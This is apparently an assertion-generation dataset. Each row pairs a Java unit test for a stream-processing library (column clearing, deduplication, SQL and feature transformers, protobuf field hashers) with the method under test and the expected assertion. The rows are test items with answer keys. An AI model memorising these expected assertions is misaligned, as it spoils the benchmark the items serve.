"shouldSetTargetColumnToEmpty() { Row inputRow = new Row(3); String[] columnNames = {""rule_id"", ""reason"", ""comms_data""}; Map<String, String> transformationArguments = new HashMap<>(); Map<String, String> commsData = new HashMap<>(); commsData.put(""wallet_id"", ""123""); transformationArguments.put(""targetColumnName"", ""reason""); inputRow.setField(0, ""NEWDEVICE.FREEZE.CR.UPDATE.PIN""); inputRow.setField(1, ""wallet-id-123""); inputRow.setField(2, commsData); ClearColumnTransformer clearColumnTransformer = new ClearColumnTransformer(transformationArguments, columnNames, daggerContext); Row outputRow = clearColumnTransformer.map(inputRow); ""<AssertPlaceHolder>""; }
map(Row inputRow) throws IllegalArgumentException { int targetFieldIndex = Arrays.asList(columnNames).indexOf(targetColumnName); if (targetFieldIndex == -1) { throw new IllegalArgumentException(""Target Column is not defined OR doesn't exists""); } Row outputRow = new Row(inputRow.getArity()); for (int i = 0; i < inputRow.getArity(); i++) { outputRow.setField(i, inputRow.getField(i)); } outputRow.setField(targetFieldIndex, """"); return outputRow; }"	"assertEquals("""", outputRow.getField(1))"
"shouldReturnSameColumnNames() { Row inputRow = new Row(3); String[] columnNames = {""rule_id"", ""reason"", ""comms_data""}; Map<String, String> transformationArguments = new HashMap<>(); Map<String, String> commsData = new HashMap<>(); commsData.put(""wallet_id"", ""123""); transformationArguments.put(""targetColumnName"", ""reason""); inputRow.setField(0, ""NEWDEVICE.FREEZE.CR.UPDATE.PIN""); inputRow.setField(1, ""wallet-id-123""); inputRow.setField(2, commsData); ClearColumnTransformer clearColumnTransformer = new ClearColumnTransformer(transformationArguments, columnNames, daggerContext); StreamInfo inputStreamInfo = new StreamInfo(inputStream, columnNames); StreamInfo outputStreamInfo = clearColumnTransformer.transform(inputStreamInfo); ""<AssertPlaceHolder>""; }
transform(StreamInfo inputStreamInfo) { DataStream<Row> inputStream = inputStreamInfo.getDataStream(); SingleOutputStreamOperator<Row> outputStream = inputStream.map(this); return new StreamInfo(outputStream, inputStreamInfo.getColumnNames()); }"	assertArrayEquals(columnNames, outputStreamInfo.getColumnNames())
"Exception { when(runtimeContext.getMapState(any(MapStateDescriptor.class))).thenReturn(mapState); when(mapState.contains(""TEST_STATUS"")).thenReturn(false); HashMap<String, Object> transformationArguments = new HashMap<>(); transformationArguments.put(""key_column"", ""status""); transformationArguments.put(""ttl_in_seconds"", 10); String[] columnNames = {""order_number"", ""service_type"", ""status""}; Row inputRow = new Row(3); inputRow.setField(0, ""123""); inputRow.setField(1, ""TEST_SERVICE_TYPE""); inputRow.setField(2, ""TEST_STATUS""); DeDuplicationTransformerStub deDuplicationTransformerStub = new DeDuplicationTransformerStub(transformationArguments, columnNames); deDuplicationTransformerStub.open(flinkInternalConfig);  Assert.""<AssertPlaceHolder>""; verify(mapState, times(1)).put(""TEST_STATUS"", 1); }
filter(Row value) throws Exception { String key = (String) value.getField(keyIndex); boolean keyAlreadyPresent = mapState.contains(key); if (!keyAlreadyPresent) { mapState.put(key, 1); } return !keyAlreadyPresent; }"	assertTrue(deDuplicationTransformerStub.filter(inputRow))
"shouldReturnSameColumnNames() { when(inputStream.keyBy(any(KeySelector.class))).thenReturn(keyedStream); HashMap<String, Object> transformationArguments = new HashMap<>(); transformationArguments.put(""key_column"", ""status""); transformationArguments.put(""ttl_in_seconds"", 10); String[] columnNames = {""order_number"", ""service_type"", ""status""}; Row inputRow = new Row(3); inputRow.setField(0, ""123""); inputRow.setField(1, ""TEST_SERVICE_TYPE""); inputRow.setField(2, ""TEST_STATUS""); DeDuplicationTransformer deDuplicationTransformer = new DeDuplicationTransformer(transformationArguments, columnNames, daggerContext); StreamInfo inputStreamInfo = new StreamInfo(inputStream, columnNames); StreamInfo outputStreamInfo = deDuplicationTransformer.transform(inputStreamInfo); Assert.""<AssertPlaceHolder>""; }
transform(StreamInfo inputStreamInfo) { DataStream<Row> inputStream = inputStreamInfo.getDataStream(); SingleOutputStreamOperator<Row> outputStream = inputStream .keyBy((KeySelector<Row, Object>) value -> value.getField(keyIndex)) .filter(this); return new StreamInfo(outputStream, inputStreamInfo.getColumnNames()); }"	assertArrayEquals(columnNames, outputStreamInfo.getColumnNames())
"shouldReturnSameColumnNames() { HashMap<String, String> transformationArguments = new HashMap<>(); transformationArguments.put(""keyColumnName"", ""featuresKey""); transformationArguments.put(""valueColumnName"", ""features""); String[] columnNames = {""entityKey"", ""featuresKey"", ""features""}; Row inputRow = new Row(3); inputRow.setField(0, ""test""); inputRow.setField(1, 1L); inputRow.setField(2, 2); FeatureTransformer featureTransformer = new FeatureTransformer(transformationArguments, columnNames, daggerContext); StreamInfo inputStreamInfo = new StreamInfo(inputStream, columnNames); StreamInfo outputStreamInfo = featureTransformer.transform(inputStreamInfo); Assert.""<AssertPlaceHolder>""; }
transform(StreamInfo inputStreamInfo) { DataStream<Row> inputStream = inputStreamInfo.getDataStream(); SingleOutputStreamOperator<Row> outputStream = inputStream.map(this); return new StreamInfo(outputStream, inputStreamInfo.getColumnNames()); }"	assertArrayEquals(columnNames, outputStreamInfo.getColumnNames())
"shouldReturnSameColumnNames() { HashMap<String, Object> transformationArguments = new HashMap<>(); transformationArguments.put(""outputColumnaName"", ""features""); HashMap<String, String> data = new HashMap<>(); data.put(""keyColumnName"", ""customer_id""); data.put(""valueColumnName"", ""order_number""); data.put(""type"", ""FloatType""); List<HashMap<String, String>> hashMaps = Collections.singletonList(data); transformationArguments.put(""data"", hashMaps);  String[] columnNames = {""customer_id"", ""order_number"", ""features""}; Row inputRow = new Row(3); inputRow.setField(0, ""test_customer_id""); inputRow.setField(1, ""1.4""); inputRow.setField(2, ""test_features""); FeatureWithTypeTransformer featureWithTypeTransformer = new FeatureWithTypeTransformer(transformationArguments, columnNames, daggerContext); StreamInfo inputStreamInfo = new StreamInfo(inputStream, columnNames); StreamInfo outputStreamInfo = featureWithTypeTransformer.transform(inputStreamInfo); Assert.""<AssertPlaceHolder>""; }
transform(StreamInfo inputStreamInfo) { DataStream<Row> inputStream = inputStreamInfo.getDataStream(); SingleOutputStreamOperator<Row> outputStream = inputStream.map(this); return new StreamInfo(outputStream, inputStreamInfo.getColumnNames()); }"	assertArrayEquals(columnNames, outputStreamInfo.getColumnNames())
"shouldApplyThePassedSQL() { HashMap<String, String> transformationArguments = new HashMap<>(); String sqlQuery = ""SELECT * FROM data_stream""; transformationArguments.put(""sqlQuery"", sqlQuery); String[] columnNames = {""order_number"", ""service_type"", ""status""}; String schema = String.join("","", columnNames);  when(streamTableEnvironment.sqlQuery(sqlQuery)).thenReturn(table); when(table.getSchema()).thenReturn(tableSchema); when(tableSchema.getFieldNames()).thenReturn(columnNames); when(streamTableEnvironment.toRetractStream(table, Row.class)).thenReturn(retractStream); when(retractStream.filter(any())).thenReturn(filteredRetractStream); when(filteredRetractStream.map(any())).thenReturn(outputStream); SQLTransformer sqlTransformer = new SQLTransformerStub(transformationArguments, columnNames); StreamInfo inputStreamInfo = new StreamInfo(inputStream, columnNames); StreamInfo outputStreamInfo = sqlTransformer.transform(inputStreamInfo);  verify(streamTableEnvironment, times(1)).registerDataStream(""data_stream"", inputStream, schema); verify(streamTableEnvironment, times(1)).sqlQuery(sqlQuery); ""<AssertPlaceHolder>""; }
transform(StreamInfo inputStreamInfo) { DataStream<Row> inputStream = inputStreamInfo.getDataStream(); if (sqlQuery == null) { throw new IllegalArgumentException(""SQL Query must pe provided in Transformation Arguments""); } String schema = String.join("","", columnNames); if (Arrays.asList(columnNames).contains(ROWTIME)) { schema = schema.replace(ROWTIME, ROWTIME + "".rowtime""); inputStream = assignTimeAttribute(inputStream); } StreamTableEnvironment streamTableEnvironment = daggerContext.getTableEnvironment(); streamTableEnvironment.registerDataStream(tableName, inputStream, schema);  Table table = streamTableEnvironment.sqlQuery(sqlQuery); SingleOutputStreamOperator<Row> outputStream = streamTableEnvironment .toRetractStream(table, Row.class) .filter(value -> value.f0) .map(value -> value.f1); return new StreamInfo(outputStream, table.getSchema().getFieldNames()); }"	assertEquals(outputStream, outputStreamInfo.getDataStream())
"shouldReturnColumnNamesReturnedBySQLAndUdf() { HashMap<String, String> transformationArguments = new HashMap<>(); String sqlQuery = ""SELECT order_number, service_type, multiply(1,100) product FROM data_stream""; transformationArguments.put(""sqlQuery"", sqlQuery); String[] columnNames = {""order_number"", ""service_type"", ""status"", ""product""}; streamTableEnvironment.createTemporaryFunction(""multiply"", multiply);  when(streamTableEnvironment.sqlQuery(sqlQuery)).thenReturn(table); when(table.getSchema()).thenReturn(tableSchema); String[] outputColumns = {""order_number"", ""service_type"", ""product""}; when(tableSchema.getFieldNames()).thenReturn(outputColumns); when(streamTableEnvironment.toRetractStream(table, Row.class)).thenReturn(retractStream); when(retractStream.filter(any())).thenReturn(filteredRetractStream); when(filteredRetractStream.map(any())).thenReturn(outputStream); SQLTransformer sqlTransformer = new SQLTransformerStub(transformationArguments, columnNames); StreamInfo inputStreamInfo = new StreamInfo(inputStream, columnNames); StreamInfo outputStreamInfo = sqlTransformer.transform(inputStreamInfo);  ""<AssertPlaceHolder>""; }
transform(StreamInfo inputStreamInfo) { DataStream<Row> inputStream = inputStreamInfo.getDataStream(); if (sqlQuery == null) { throw new IllegalArgumentException(""SQL Query must pe provided in Transformation Arguments""); } String schema = String.join("","", columnNames); if (Arrays.asList(columnNames).contains(ROWTIME)) { schema = schema.replace(ROWTIME, ROWTIME + "".rowtime""); inputStream = assignTimeAttribute(inputStream); } StreamTableEnvironment streamTableEnvironment = daggerContext.getTableEnvironment(); streamTableEnvironment.registerDataStream(tableName, inputStream, schema);  Table table = streamTableEnvironment.sqlQuery(sqlQuery); SingleOutputStreamOperator<Row> outputStream = streamTableEnvironment .toRetractStream(table, Row.class) .filter(value -> value.f0) .map(value -> value.f1); return new StreamInfo(outputStream, table.getSchema().getFieldNames()); }"	assertArrayEquals(outputColumns, outputStreamInfo.getColumnNames())
"shouldReturnColumnNamesReturnedBySQL() { HashMap<String, String> transformationArguments = new HashMap<>(); String sqlQuery = ""SELECT order_number, service_type FROM data_stream""; transformationArguments.put(""sqlQuery"", sqlQuery); String[] columnNames = {""order_number"", ""service_type"", ""status""};  when(streamTableEnvironment.sqlQuery(sqlQuery)).thenReturn(table); when(table.getSchema()).thenReturn(tableSchema); String[] outputColumns = {""order_number"", ""service_type""}; when(tableSchema.getFieldNames()).thenReturn(outputColumns); when(streamTableEnvironment.toRetractStream(table, Row.class)).thenReturn(retractStream); when(retractStream.filter(any())).thenReturn(filteredRetractStream); when(filteredRetractStream.map(any())).thenReturn(outputStream); SQLTransformer sqlTransformer = new SQLTransformerStub(transformationArguments, columnNames); StreamInfo inputStreamInfo = new StreamInfo(inputStream, columnNames); StreamInfo outputStreamInfo = sqlTransformer.transform(inputStreamInfo);  ""<AssertPlaceHolder>""; }
transform(StreamInfo inputStreamInfo) { DataStream<Row> inputStream = inputStreamInfo.getDataStream(); if (sqlQuery == null) { throw new IllegalArgumentException(""SQL Query must pe provided in Transformation Arguments""); } String schema = String.join("","", columnNames); if (Arrays.asList(columnNames).contains(ROWTIME)) { schema = schema.replace(ROWTIME, ROWTIME + "".rowtime""); inputStream = assignTimeAttribute(inputStream); } StreamTableEnvironment streamTableEnvironment = daggerContext.getTableEnvironment(); streamTableEnvironment.registerDataStream(tableName, inputStream, schema);  Table table = streamTableEnvironment.sqlQuery(sqlQuery); SingleOutputStreamOperator<Row> outputStream = streamTableEnvironment .toRetractStream(table, Row.class) .filter(value -> value.f0) .map(value -> value.f1); return new StreamInfo(outputStream, table.getSchema().getFieldNames()); }"	assertArrayEquals(outputColumns, outputStreamInfo.getColumnNames())
"shouldAssignTimestampAndWatermarksIfRowtimeIsPassedInColumns() { HashMap<String, String> transformationArguments = new HashMap<>(); String sqlQuery = ""SELECT * FROM data_stream""; transformationArguments.put(""sqlQuery"", sqlQuery); String[] columnNames = {""order_number"", ""service_type"", ""rowtime""}; String schema = ""order_number,service_type,rowtime.rowtime"";  when(streamTableEnvironment.sqlQuery(sqlQuery)).thenReturn(table); when(table.getSchema()).thenReturn(tableSchema); when(tableSchema.getFieldNames()).thenReturn(columnNames); when(streamTableEnvironment.toRetractStream(table, Row.class)).thenReturn(retractStream); when(retractStream.filter(any())).thenReturn(filteredRetractStream); when(filteredRetractStream.map(any())).thenReturn(outputStream); when(inputStream.assignTimestampsAndWatermarks(any(WatermarkStrategy.class))).thenReturn(watermarkedStream); SQLTransformer sqlTransformer = new SQLTransformerStub(transformationArguments, columnNames); StreamInfo inputStreamInfo = new StreamInfo(inputStream, columnNames); StreamInfo outputStreamInfo = sqlTransformer.transform(inputStreamInfo);  verify(streamTableEnvironment, times(1)).registerDataStream(""data_stream"", watermarkedStream, schema); verify(streamTableEnvironment, times(1)).sqlQuery(sqlQuery); verify(inputStream, times(1)).assignTimestampsAndWatermarks(any(WatermarkStrategy.class)); ""<AssertPlaceHolder>""; }
transform(StreamInfo inputStreamInfo) { DataStream<Row> inputStream = inputStreamInfo.getDataStream(); if (sqlQuery == null) { throw new IllegalArgumentException(""SQL Query must pe provided in Transformation Arguments""); } String schema = String.join("","", columnNames); if (Arrays.asList(columnNames).contains(ROWTIME)) { schema = schema.replace(ROWTIME, ROWTIME + "".rowtime""); inputStream = assignTimeAttribute(inputStream); } StreamTableEnvironment streamTableEnvironment = daggerContext.getTableEnvironment(); streamTableEnvironment.registerDataStream(tableName, inputStream, schema);  Table table = streamTableEnvironment.sqlQuery(sqlQuery); SingleOutputStreamOperator<Row> outputStream = streamTableEnvironment .toRetractStream(table, Row.class) .filter(value -> value.f0) .map(value -> value.f1); return new StreamInfo(outputStream, table.getSchema().getFieldNames()); }"	assertEquals(outputStream, outputStreamInfo.getDataStream())
"shouldNotAssignTimestampAndWatermarksIfRowtimeIsNotPassedInColumns() { HashMap<String, String> transformationArguments = new HashMap<>(); String sqlQuery = ""SELECT * FROM data_stream""; transformationArguments.put(""sqlQuery"", sqlQuery); String[] columnNames = {""order_number"", ""service_type"", ""status""}; String schema = ""order_number,service_type,status"";  when(streamTableEnvironment.sqlQuery(sqlQuery)).thenReturn(table); when(table.getSchema()).thenReturn(tableSchema); when(tableSchema.getFieldNames()).thenReturn(columnNames); when(streamTableEnvironment.toRetractStream(table, Row.class)).thenReturn(retractStream); when(retractStream.filter(any())).thenReturn(filteredRetractStream); when(filteredRetractStream.map(any())).thenReturn(outputStream); SQLTransformer sqlTransformer = new SQLTransformerStub(transformationArguments, columnNames); StreamInfo inputStreamInfo = new StreamInfo(inputStream, columnNames); StreamInfo outputStreamInfo = sqlTransformer.transform(inputStreamInfo);  verify(streamTableEnvironment, times(1)).registerDataStream(""data_stream"", inputStream, schema); verify(streamTableEnvironment, times(1)).sqlQuery(sqlQuery); verify(inputStream, times(0)).assignTimestampsAndWatermarks(any(BoundedOutOfOrdernessTimestampExtractor.class)); ""<AssertPlaceHolder>""; }
transform(StreamInfo inputStreamInfo) { DataStream<Row> inputStream = inputStreamInfo.getDataStream(); if (sqlQuery == null) { throw new IllegalArgumentException(""SQL Query must pe provided in Transformation Arguments""); } String schema = String.join("","", columnNames); if (Arrays.asList(columnNames).contains(ROWTIME)) { schema = schema.replace(ROWTIME, ROWTIME + "".rowtime""); inputStream = assignTimeAttribute(inputStream); } StreamTableEnvironment streamTableEnvironment = daggerContext.getTableEnvironment(); streamTableEnvironment.registerDataStream(tableName, inputStream, schema);  Table table = streamTableEnvironment.sqlQuery(sqlQuery); SingleOutputStreamOperator<Row> outputStream = streamTableEnvironment .toRetractStream(table, Row.class) .filter(value -> value.f0) .map(value -> value.f1); return new StreamInfo(outputStream, table.getSchema().getFieldNames()); }"	assertEquals(outputStream, outputStreamInfo.getDataStream())
"shouldAssignPassedTableNameIfPassedInArguments() { HashMap<String, String> transformationArguments = new HashMap<>(); String sqlQuery = ""SELECT * FROM data_stream""; transformationArguments.put(""sqlQuery"", sqlQuery); transformationArguments.put(""tableName"", ""booking""); String[] columnNames = {""order_number"", ""service_type"", ""status""}; String schema = ""order_number,service_type,status"";  when(streamTableEnvironment.sqlQuery(sqlQuery)).thenReturn(table); when(table.getSchema()).thenReturn(tableSchema); when(tableSchema.getFieldNames()).thenReturn(columnNames); when(streamTableEnvironment.toRetractStream(table, Row.class)).thenReturn(retractStream); when(retractStream.filter(any())).thenReturn(filteredRetractStream); when(filteredRetractStream.map(any())).thenReturn(outputStream); SQLTransformer sqlTransformer = new SQLTransformerStub(transformationArguments, columnNames); StreamInfo inputStreamInfo = new StreamInfo(inputStream, columnNames); StreamInfo outputStreamInfo = sqlTransformer.transform(inputStreamInfo);  verify(streamTableEnvironment, times(1)).registerDataStream(""booking"", inputStream, schema); verify(streamTableEnvironment, times(1)).sqlQuery(sqlQuery); ""<AssertPlaceHolder>""; }
transform(StreamInfo inputStreamInfo) { DataStream<Row> inputStream = inputStreamInfo.getDataStream(); if (sqlQuery == null) { throw new IllegalArgumentException(""SQL Query must pe provided in Transformation Arguments""); } String schema = String.join("","", columnNames); if (Arrays.asList(columnNames).contains(ROWTIME)) { schema = schema.replace(ROWTIME, ROWTIME + "".rowtime""); inputStream = assignTimeAttribute(inputStream); } StreamTableEnvironment streamTableEnvironment = daggerContext.getTableEnvironment(); streamTableEnvironment.registerDataStream(tableName, inputStream, schema);  Table table = streamTableEnvironment.sqlQuery(sqlQuery); SingleOutputStreamOperator<Row> outputStream = streamTableEnvironment .toRetractStream(table, Row.class) .filter(value -> value.f0) .map(value -> value.f1); return new StreamInfo(outputStream, table.getSchema().getFieldNames()); }"	assertEquals(outputStream, outputStreamInfo.getDataStream())
"shouldReturnOutputColumnIndex() { HashMap<String, Object> stringObjectHashMap = new HashMap<>(); stringObjectHashMap.put(""outputColumnName"", ""features""); HashMap<String, String> data = new HashMap<>(); data.put(""keyColumnName"", ""customer_id""); data.put(""valueColumnName"", ""order_number""); data.put(""type"", ""StingType""); List<HashMap<String, String>> hashMaps = Collections.singletonList(data); stringObjectHashMap.put(""data"", hashMaps);  String[] inputColumnNames = {""customer_id"", ""order_number"", ""features""}; FeatureWithTypeHandler featureWithTypeHandler = new FeatureWithTypeHandler(stringObjectHashMap, inputColumnNames); int outputColumnIndex = featureWithTypeHandler.getOutputColumnIndex();  Assert.""<AssertPlaceHolder>""; }
getOutputColumnIndex() { int outputColumnIndex = Arrays.asList(inputColumns).indexOf(outputColumnName); if (outputColumnIndex == -1) { throw new IllegalArgumentException(""OutputColumnName is not given or not exist""); } return outputColumnIndex; }"	assertEquals(2, outputColumnIndex)
"shouldCreateChildForStringField() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage .getDescriptor() .findFieldByName(""order_number""); String[] fieldPath = {""order_number""}; FieldHasher childHasher = new FieldHasherFactory().createChildHasher(fieldPath, fieldDescriptor);  Assert.""<AssertPlaceHolder>""; }
createChildHasher(String[] fieldPath, Descriptors.FieldDescriptor fieldDescriptor) { List<FieldHasher> fieldHashers = Arrays.asList( new StringFieldHasher(fieldPath), new IntegerFieldHasher(fieldPath), new LongFieldHasher(fieldPath), new RowHasher(fieldPath));  return fieldHashers .stream() .filter(singleFieldHash -> singleFieldHash.canProcess(fieldDescriptor)) .findFirst() .orElse(new UnsupportedDataTypeHasher(fieldPath)) .setChild(fieldDescriptor); }"	assertTrue(childHasher instanceof StringFieldHasher)
"shouldCreateChildForIntegerField() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage .getDescriptor() .findFieldByName(""booking_creation_time"") .getMessageType() .findFieldByName(""nanos""); String[] fieldPath = {""nanos""}; FieldHasher childHasher = new FieldHasherFactory().createChildHasher(fieldPath, fieldDescriptor);  Assert.""<AssertPlaceHolder>""; }
createChildHasher(String[] fieldPath, Descriptors.FieldDescriptor fieldDescriptor) { List<FieldHasher> fieldHashers = Arrays.asList( new StringFieldHasher(fieldPath), new IntegerFieldHasher(fieldPath), new LongFieldHasher(fieldPath), new RowHasher(fieldPath));  return fieldHashers .stream() .filter(singleFieldHash -> singleFieldHash.canProcess(fieldDescriptor)) .findFirst() .orElse(new UnsupportedDataTypeHasher(fieldPath)) .setChild(fieldDescriptor); }"	assertTrue(childHasher instanceof IntegerFieldHasher)
"shouldCreateChildForLongField() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage .getDescriptor() .findFieldByName(""booking_creation_time"") .getMessageType() .findFieldByName(""seconds""); String[] fieldPath = {""seconds""}; FieldHasher childHasher = new FieldHasherFactory().createChildHasher(fieldPath, fieldDescriptor);  Assert.""<AssertPlaceHolder>""; }
createChildHasher(String[] fieldPath, Descriptors.FieldDescriptor fieldDescriptor) { List<FieldHasher> fieldHashers = Arrays.asList( new StringFieldHasher(fieldPath), new IntegerFieldHasher(fieldPath), new LongFieldHasher(fieldPath), new RowHasher(fieldPath));  return fieldHashers .stream() .filter(singleFieldHash -> singleFieldHash.canProcess(fieldDescriptor)) .findFirst() .orElse(new UnsupportedDataTypeHasher(fieldPath)) .setChild(fieldDescriptor); }"	assertTrue(childHasher instanceof LongFieldHasher)
"shouldCreateChildForRowField() { Descriptors.FieldDescriptor fieldDescriptor = TestEnrichedBookingLogMessage .getDescriptor() .findFieldByName(""booking_log"");  String[] fieldPath = {""booking_log"", ""order_number""}; FieldHasher childHasher = new FieldHasherFactory().createChildHasher(fieldPath, fieldDescriptor);  Assert.""<AssertPlaceHolder>""; }
createChildHasher(String[] fieldPath, Descriptors.FieldDescriptor fieldDescriptor) { List<FieldHasher> fieldHashers = Arrays.asList( new StringFieldHasher(fieldPath), new IntegerFieldHasher(fieldPath), new LongFieldHasher(fieldPath), new RowHasher(fieldPath));  return fieldHashers .stream() .filter(singleFieldHash -> singleFieldHash.canProcess(fieldDescriptor)) .findFirst() .orElse(new UnsupportedDataTypeHasher(fieldPath)) .setChild(fieldDescriptor); }"	assertTrue(childHasher instanceof RowHasher)
"shouldProcessIntegerLeafRow() { Descriptors.Descriptor timeStampDescriptor = Timestamp.getDescriptor(); String[] fieldPath = {""nanos""}; IntegerFieldHasher integerFieldHasher = new IntegerFieldHasher(fieldPath);  Assert.""<AssertPlaceHolder>""; }
canProcess(Descriptors.FieldDescriptor fieldDescriptor) { return fieldPath.length == 1 && isValidNonRepeatedField(fieldDescriptor) && fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.INT; }"	"assertTrue(integerFieldHasher.canProcess(timeStampDescriptor.findFieldByName(""nanos"")))"
"shouldNotProcessRepeatedIntegerLeafRow() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage .newBuilder() .getDescriptorForType() .findFieldByName(""int_array_field""); String[] fieldPath = {""int_array_field""}; IntegerFieldHasher integerFieldHasher = new IntegerFieldHasher(fieldPath);  Assert.""<AssertPlaceHolder>""; }
canProcess(Descriptors.FieldDescriptor fieldDescriptor) { return fieldPath.length == 1 && isValidNonRepeatedField(fieldDescriptor) && fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.INT; }"	assertFalse(integerFieldHasher.canProcess(fieldDescriptor))
"shouldNotProcessNonLeafRow() { Descriptors.Descriptor timeStampDescriptor = Timestamp.getDescriptor(); String[] fieldPath = {""created_at"", ""nanos""}; IntegerFieldHasher integerFieldHasher = new IntegerFieldHasher(fieldPath);  Assert.""<AssertPlaceHolder>""; }
canProcess(Descriptors.FieldDescriptor fieldDescriptor) { return fieldPath.length == 1 && isValidNonRepeatedField(fieldDescriptor) && fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.INT; }"	"assertFalse(integerFieldHasher.canProcess(timeStampDescriptor.findFieldByName(""nanos"")))"
"shouldNotSetAnyChild() { Descriptors.Descriptor timeStampDescriptor = Timestamp.getDescriptor(); String[] fieldPath = {""nanos""}; IntegerFieldHasher integerFieldHasher = new IntegerFieldHasher(fieldPath); FieldHasher fieldHasher = integerFieldHasher.setChild(timeStampDescriptor.findFieldByName(""nanos""));  Assert.""<AssertPlaceHolder>""; }
setChild(Descriptors.FieldDescriptor fieldDescriptor) { return this; }"	assertEquals(integerFieldHasher, fieldHasher)
"shouldProcessLongLeafRow() { Descriptors.Descriptor timeStampDescriptor = Timestamp.getDescriptor(); String[] fieldPath = {""seconds""}; LongFieldHasher longFieldHasher = new LongFieldHasher(fieldPath);  Assert.""<AssertPlaceHolder>""; }
canProcess(Descriptors.FieldDescriptor fieldDescriptor) { return fieldPath.length == 1 && isValidNonRepeatedField(fieldDescriptor) && fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.LONG; }"	"assertTrue(longFieldHasher.canProcess(timeStampDescriptor.findFieldByName(""seconds"")))"
"shouldNotProcessRepeatedLongLeafRow() { Descriptors.FieldDescriptor fieldDescriptor = TestMessage .newBuilder() .getDescriptorForType() .findFieldByName(""repeated_long_field""); String[] fieldPath = {""repeated_long_field""}; LongFieldHasher longFieldHasher = new LongFieldHasher(fieldPath);  Assert.""<AssertPlaceHolder>""; }
canProcess(Descriptors.FieldDescriptor fieldDescriptor) { return fieldPath.length == 1 && isValidNonRepeatedField(fieldDescriptor) && fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.LONG; }"	assertFalse(longFieldHasher.canProcess(fieldDescriptor))
"shouldNotProcessNonLeafRow() { Descriptors.Descriptor timeStampDescriptor = Timestamp.getDescriptor(); String[] fieldPath = {""created_at"", ""seconds""}; LongFieldHasher longFieldHasher = new LongFieldHasher(fieldPath);  Assert.""<AssertPlaceHolder>""; }
canProcess(Descriptors.FieldDescriptor fieldDescriptor) { return fieldPath.length == 1 && isValidNonRepeatedField(fieldDescriptor) && fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.LONG; }"	"assertFalse(longFieldHasher.canProcess(timeStampDescriptor.findFieldByName(""seconds"")))"
"shouldNotSetAnyChild() { Descriptors.Descriptor timeStampDescriptor = Timestamp.getDescriptor(); String[] fieldPath = {""seconds""}; LongFieldHasher longFieldHasher = new LongFieldHasher(fieldPath); FieldHasher fieldHasher = longFieldHasher.setChild(timeStampDescriptor.findFieldByName(""seconds""));  Assert.""<AssertPlaceHolder>""; }
setChild(Descriptors.FieldDescriptor fieldDescriptor) { return this; }"	assertEquals(longFieldHasher, fieldHasher)
"shouldMaskLongFieldInARow() { String[] fieldPath = {""seconds""}; LongFieldHasher longFieldHasher = new LongFieldHasher(fieldPath);  Assert.""<AssertPlaceHolder>""; }
maskRow(Object elem) { try { long fieldValue = getHashFunction() .hashLong((Long) elem) .asLong(); return fieldValue; } catch (Exception ex) { throw new RowHashException(""Unable to hash long value for field : "" + fieldPath[0], ex); } }"	assertEquals(-8613927256589200991L, longFieldHasher.maskRow(10L))
"shouldProcessRow() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage .newBuilder() .getDescriptorForType() .findFieldByName(""event_timestamp"");  String[] fieldPath = {""event_timestamp"", ""nanos""}; RowHasher rowHasher = new RowHasher(fieldPath);  Assert.""<AssertPlaceHolder>""; }
canProcess(Descriptors.FieldDescriptor fieldDescriptor) { return splittedFieldPath.length > 1 && isValidNonRepeatedField(fieldDescriptor) && fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.MESSAGE; }"	assertTrue(rowHasher.canProcess(fieldDescriptor))
"shouldNotProcessRepeatedRow() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage .newBuilder() .getDescriptorForType() .findFieldByName(""routes""); String[] fieldPath = {""routes[0""}; RowHasher rowHasher = new RowHasher(fieldPath);  Assert.""<AssertPlaceHolder>""; }
canProcess(Descriptors.FieldDescriptor fieldDescriptor) { return splittedFieldPath.length > 1 && isValidNonRepeatedField(fieldDescriptor) && fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.MESSAGE; }"	assertFalse(rowHasher.canProcess(fieldDescriptor))
"shouldNotProcessLeafRow() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage .newBuilder() .getDescriptorForType() .findFieldByName(""order_number""); String[] fieldPath = {""order_number""}; RowHasher rowHasher = new RowHasher(fieldPath);  Assert.""<AssertPlaceHolder>""; }
canProcess(Descriptors.FieldDescriptor fieldDescriptor) { return splittedFieldPath.length > 1 && isValidNonRepeatedField(fieldDescriptor) && fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.MESSAGE; }"	assertFalse(rowHasher.canProcess(fieldDescriptor))
"shouldProcessStringLeafRow() { Descriptors.Descriptor parentDescriptor = TestBookingLogMessage.getDescriptor(); String[] fieldPath = {""order_number""}; StringFieldHasher stringFieldHasher = new StringFieldHasher(fieldPath);  Assert.""<AssertPlaceHolder>""; }
canProcess(Descriptors.FieldDescriptor fieldDescriptor) { return fieldPath.length == 1 && isValidNonRepeatedField(fieldDescriptor) && fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.STRING; }"	"assertTrue(stringFieldHasher.canProcess(parentDescriptor.findFieldByName(""order_number"")))"
"shouldNotProcessRepeatedStringLeafRow() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage .newBuilder() .getDescriptorForType() .findFieldByName(""meta_array""); String[] fieldPath = {""meta_array""}; StringFieldHasher stringFieldHasher = new StringFieldHasher(fieldPath);  Assert.""<AssertPlaceHolder>""; }
canProcess(Descriptors.FieldDescriptor fieldDescriptor) { return fieldPath.length == 1 && isValidNonRepeatedField(fieldDescriptor) && fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.STRING; }"	assertFalse(stringFieldHasher.canProcess(fieldDescriptor))
"shouldNotProcessNonLeafRow() { Descriptors.Descriptor bookingDescriptor = TestEnrichedBookingLogMessage.getDescriptor(); String[] fieldPath = {""booking_log"", ""order_number""}; StringFieldHasher stringFieldHasher = new StringFieldHasher(fieldPath);  Assert.""<AssertPlaceHolder>""; }
